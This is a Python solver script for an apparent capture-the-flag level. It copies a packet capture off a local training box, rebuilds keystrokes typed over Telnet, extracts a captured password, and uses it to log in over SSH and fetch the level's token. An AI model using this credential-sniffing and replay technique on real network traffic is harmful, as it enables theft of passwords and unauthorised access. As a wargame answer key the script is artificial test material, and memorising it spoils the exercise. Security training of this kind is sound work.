import sys
import os
import tempfile
import dpkt
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag


def parse_pcap(f):
    packets = []
    try:
        for ts, buf in dpkt.pcap.Reader(open(f, "rb")):
            eth = dpkt.ethernet.Ethernet(buf)
            if (
                isinstance(eth.data, dpkt.ip.IP)
                and isinstance(eth.data.data, dpkt.tcp.TCP)
                and eth.data.data.data
            ):
                packets.append(eth.data.data.data)
    except:
        pass
    return packets


def extract_password(payloads):
    stream, text, i = b"".join(payloads), [], 0
    while i < len(stream):
        if stream[i] == 0xFF and i + 1 < len(stream):
            i += 2
        else:
            b = stream[i]
            if b == 0x7F and text:
                text.pop()
            elif 0x20 <= b < 0x7F:
                text.append(chr(b))
            elif b in (0x0A, 0x0D) and text:
                text.append("\n")
            i += 1
    return "".join(text)


def exploit():
    print("[*] Level02 PCAP Extractor\n[*] Copying...")
    pwd = read_flag(1)
    with tempfile.TemporaryDirectory() as tmpdir:
        local = os.path.join(tmpdir, "level02.pcap")
        if not any(
            scp_cmd("localhost", 4242, "level02", pwd, loc, local)
            for loc in ["/home/user/level02/level02.pcap"]
        ):
            print("[-] Copy failed")
            return False, "", ""
        try:
            os.chmod(local, 0o644)
        except:
            pass
        print("[+] Analyzing...")
        try:
            result = extract_password(parse_pcap(local))
            password = next(
                (
                    l.split("Password:")[-1].strip()
                    for l in result.split("\n")
                    if "Password:" in l
                ),
                None,
            )
            if not password:
                print("[-] Not found")
                return False, "", ""
        except Exception as e:
            print(f"[-] Error: {e}")
            return False, "", ""
        print(f"[+] Pass: {password}\n[*] Connecting...")
        code, out, err = ssh_cmd("localhost", 4242, "flag02", password, "getflag")
        if code == 0 and "token" in out.lower():
            print(f"[+] OK\n{out}")
            return True, out.split(":")[-1].strip(), password
        print("[-] Failed")
        return False, "", ""


def main():
    success, token, password = exploit()
    if success:
        save_flag(2, token)
        print(f"[ANSWER]\n  Pass: {password}\n  Token: {token}")
    else:
        print("[-] Failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
